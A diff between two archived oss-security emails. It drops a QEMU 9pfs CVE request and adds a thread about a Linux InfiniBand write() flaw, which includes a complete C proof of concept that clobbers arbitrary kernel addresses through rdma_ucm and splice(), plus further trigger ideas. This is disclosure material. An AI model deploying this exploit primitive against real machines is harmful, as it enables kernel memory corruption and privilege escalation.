@@ -1,33 +1,144 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/28/4
-Message-ID: <alpine.LFD.2.20.1610281523450.17516@wniryva>
-Date: Fri, 28 Oct 2016 15:25:02 +0530 (IST)
-From: P J P <ppandit@...hat.com>
-To: oss security list <oss-security@...ts.openwall.com>
-cc: Li Qiang <liqiang6-s@....cn>
-Subject: CVE request Qemu: 9pfs: memory leakage in v9fs_write
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/09/13
+Message-ID: <20160509193955.GA3317@pc.thejh.net>
+Date: Mon, 9 May 2016 21:39:55 +0200
+From: Jann Horn <jann@...jh.net>
+To: Yann Droneaud <ydroneaud@...eya.com>
+Cc: Jason Gunthorpe <jgunthorpe@...idianresearch.com>, Doug Ledford <dledford@...hat.com>, linux-rdma@...r.kernel.org, oss-security@...ts.openwall.com
+Subject: Re: CVE Request: Linux: IB/security: Restrict use of the write() interface'
 Content-Type: text/plain; charset=utf-8
 
-   Hello,
+On Mon, May 09, 2016 at 09:10:41PM +0200, Yann Droneaud wrote:
+> [Cc: oss-security@...ts.openwall.com]
+> 
+> Hi,
+> 
+> Le lundi 09 mai 2016 à 20:02 +0200, Jann Horn a écrit :
+> > On Sat, May 07, 2016 at 08:19:46PM +0200, Yann Droneaud wrote:
+> > > Le samedi 07 mai 2016 à 06:22 +0200, Salvatore Bonaccorso a écrit :
+> > > > 
+> > > >  
+> > > > Jann Horn reported an issue in the infiniband stack. It has been
+> > > > fixed in v4.6-rc6 with commit
+> > > > e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3:
+> > > > 
+> > > > https://git.kernel.org/linus/e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3
+> > > > 
+> > > > > 
+> > > > > 
+> > > > > IB/security: Restrict use of the write() interface
+> > > > > The drivers/infiniband stack uses write() as a replacement for
+> > > > > bi-directional ioctl().  This is not safe. There are ways to
+> > > > > trigger write calls that result in the return structure that
+> > > > > is normally written to user space being shunted off to user
+> > > > > specified kernel memory instead.
+> > > > > 
+> > > That's an interesting issue.
+> > > 
+> > > I thought access_ok() done as part of copy_to_user() would protect
+> > > from such unwelcomed behavior. But it's not if the kernel invoke
+> > > write() handler outside of a user process.
+> > > 
+> > > Anyway, as I don't see yet how to reproduce the issue, is there a
+> > > PoC available, I would be interested by a mean to trigger such
+> > > write().
+> 
+> > Here is my writeup of the issue that I made quite a while ago - the
+> > timeline is missing some of the more recent stuff, but meh.
+> > 
+> > ======================================================
+> > 
+> > 
+> > Here is a PoC that can be used to clobber data at arbitrary
+> > writable kernel addresses if the rdma_ucm module is loaded (without
+> > actually needing Infiniband hardware to be present):
+> > 
+> > =====
+> > #define _GNU_SOURCE
+> > #include 
+> > #include 
+> > #include 
+> > #include 
+> > #include 
+> > #include 
+> > 
+> > #include 
+> > #include 
+> > #include 
+> > #include 
+> > #include 
+> > 
+> > #define RDMA_PS_TCP 0x0106
+> > 
+> > // This method forces the kernel to write arbitrary data to the
+> > // target fd under set_fs(KERNEL_DS), bypassing address limit
+> > // checks in anything that extracts pointers from written data.
+> > int write_without_addr_limit(int fd, char *buf, size_t len) {
+> >   int pipefds[2];
+> >   if (pipe(pipefds))
+> >     return -1;
+> >   ssize_t len_ = write(pipefds[1], buf, len);
+> >   if (len == -1)
+> >     return -1;
+> >   int res = splice(pipefds[0], NULL, fd, NULL, len_, 0);
+> >   int errno_ = errno;
+> >   close(pipefds[0]);
+> >   close(pipefds[1]);
+> >   errno = errno_;
+> >   return res;
+> > }
+> > 
+> > int clobber_kaddr(unsigned long kaddr) {
+> >   // open infiniband fd
+> >   int fd = open("/dev/infiniband/rdma_cm", O_RDWR);
+> >   if (fd == -1)
+> >     err(1, "unable to open /dev/infiniband/rdma_cm - maybe the RDMA kernel module isn't loaded?");
+> > 
+> >   // craft malicious write buffer
+> >   // structure:
+> >   //   struct rdma_ucm_cmd_hdr hdr
+> >   //   struct rdma_ucm_create_id cmd
+> >   char buf[sizeof(struct rdma_ucm_cmd_hdr) + sizeof(struct rdma_ucm_create_id)];
+> >   struct rdma_ucm_cmd_hdr *hdr = (void*)buf;
+> >   struct rdma_ucm_create_id *cmd = (void*)(buf + sizeof(struct rdma_ucm_cmd_hdr));
+> >   hdr->cmd = RDMA_USER_CM_CMD_CREATE_ID;
+> >   hdr->in = 0;
+> >   hdr->out = sizeof(struct rdma_ucm_create_id_resp);
+> >   cmd->ps = RDMA_PS_TCP;
+> >   cmd->response = kaddr;
+> > 
+> >   int res = write_without_addr_limit(fd, buf, sizeof(buf));
+> >   int errno_ = errno;
+> >   close(fd);
+> >   errno = errno_;
+> >   return res;
+> > }
+> > 
+> > int main(int argc, char **argv) {
+> >   if (argc != 2)
+> >     errx(1, "want one argument (kernel address to clobber)");
+> >   char *endp;
+> >   unsigned long kaddr = strtoul(argv[1], &endp, 0);
+> >   if (kaddr == ULONG_MAX || *endp || endp == argv[1])
+> >     errx(1, "bad input number");
+> > 
+> >   int r = clobber_kaddr(kaddr);
+> >   if (r >= 0) {
+> >     printf("that probably worked? clobber_kaddr(0x%lx)=%d\n", kaddr, r);
+> >     return 0;
+> >   } else {
+> >     printf("failed: %m\n");
+> >     return 1;
+> >   }
+> > }
+> 
+> 
+> Is this only achievable through splice() ?
 
-Quick Emulator(Qemu) built with the VirtFS, host directory sharing via Plan 9 
-File System(9pfs) support, is vulnerable to a memory leakage issue. It could 
-occur when calling v9fs_write call.
+sendfile() and the new copy_file_range() syscall (in kernel >=4.5) would
+probably both work, too - they all use the splice mechanism internally.
 
-A privileged user inside guest could use this flaw to leak the host memory 
-bytes resulting in DoS for other services.
+ecryptfs also calls the VFS methods of the lower filesystem under KERNEL_DS
+iirc, it might also be possible to attack infiniband that way.
 
-Upstream patches:
------------------
-   -> https://lists.gnu.org/archive/html/qemu-devel/2016-10/msg02623.html
-
-Reference:
-----------
-   -> http://wiki.qemu.org/Documentation/9psetup
-
-This issue was reported by Li Qiang of 360.cn Inc.
-
-Thank you.
---
-Prasad J Pandit / Red Hat Product Security Team
-47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
